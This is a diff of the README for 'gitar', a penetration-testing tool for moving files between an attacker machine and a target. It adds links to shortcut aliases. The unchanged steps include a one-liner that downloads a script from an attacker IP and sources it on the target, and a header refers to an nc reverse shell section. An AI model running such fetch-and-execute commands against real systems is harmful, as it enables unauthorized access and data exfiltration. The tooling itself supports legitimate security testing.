@@ -27,6 +27,8 @@ On my target machine:
 
 ## Set up
 
+***~>*** To make **set up even simpler** shortcut/aliases are a great benefit. See [them 💥](https://github.com/ariary/bang/blob/main/README.md#gitar-pentest-easy-file-sharing)
+
 ### Pre-requisites
 
 * HTTP Network connectivy between attacker & target machine
@@ -39,14 +41,17 @@ On my target machine:
 The aim is to keep "target requirements" as fit as possible. Attacker machine requirements are not a big deal as we have plenty control over it and time to configure it.
 
 ### Steps
-
+ 
  1. <sup>(Attacker machine)</sup> Launch the "server" : `gitar -e [server_reachable_ip]`
  2. <sup>(Target machine)</sup> Get shortcuts and source them. The one-liner corresponding is by default copy on clipboard. It is also provided by step 1. (in gitar output): `curl -s http://[attacker_ip:port]/alias > /tmp/alias && source /tmp/alias && rm /tmp/alias`
 
 **And that's all, you can now `push`or `pull` file [🎶](#tldr---and-listen-music)**
 
+ [`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files)
+
 ### Steps for a more secure ` gitar`
 
+ 
 This is basicaly the same as basic usage. But as we expose our http server we become the prey. Hence we must harden a bit our server. To do this we launch `gitar` inside a container and use HTTPS.
 
 * To enable HTTPS you must have certificates. Generate them with `generate.sh`.
@@ -60,6 +65,7 @@ The following steps expose files of current directory. Files uploaded by remote 
 
 **You can now `push`or `pull` file being more safe [🎶](#tldr---and-listen-music)**
 
+[`with 💥`](https://github.com/ariary/bang/blob/main/EXAMPLES.md#share-files-safely)
 
 ### Steps with a `nc` reverse shell
 
